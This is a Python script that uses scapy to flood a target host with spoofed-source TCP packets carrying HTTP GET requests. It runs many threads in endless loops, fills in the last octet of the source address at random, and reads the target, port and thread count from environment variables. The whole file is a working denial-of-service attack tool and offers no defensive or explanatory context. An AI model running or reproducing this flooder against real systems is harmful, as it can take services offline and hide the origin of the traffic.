from scapy.all import IP, TCP, send
import threading
import random
import time
import os

def generate_fake_ip(base_fake_ip):
    ip_parts = base_fake_ip.split('.')
    ip_parts[-1] = str(random.randint(1, 254))
    return '.'.join(ip_parts)

def send_http_request(target_ip, fake_ip, port):
    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: None\r\n\r\n"
    ip = IP(src=fake_ip, dst=target_ip)
    tcp = TCP(dport=port, sport=random.randint(1024, 65535), flags="A",
              seq=random.randint(1000, 9999), ack=0)
    packet = ip / tcp / request.encode()
    send(packet, verbose=0)

def attack(target_ip, port, base_fake_ip, delay):
    while True:
        fake_ip = generate_fake_ip(base_fake_ip)
        send_http_request(target_ip, fake_ip, port)
        print(f"Sent HTTP request from fake IP: {fake_ip} to {target_ip}:{port}")
        time.sleep(delay)

def start_attack(target_ip, port, base_fake_ip, threads, delay):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(target_ip, port, base_fake_ip, delay))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    target_ip = os.environ.get('TARGET_IP', '192.168.2.22')
    port = int(os.environ.get('PORT', 80))
    threads = int(os.environ.get('THREADS', 10))
    delay = 0.01
    
    # Extract base IP from target
    ip_parts = target_ip.split('.')
    base_fake_ip = '.'.join(ip_parts[:3]) + '.'

    try:
        start_attack(target_ip, port, base_fake_ip, threads, delay)
    except KeyboardInterrupt:
        print("\nAttack stopped.")
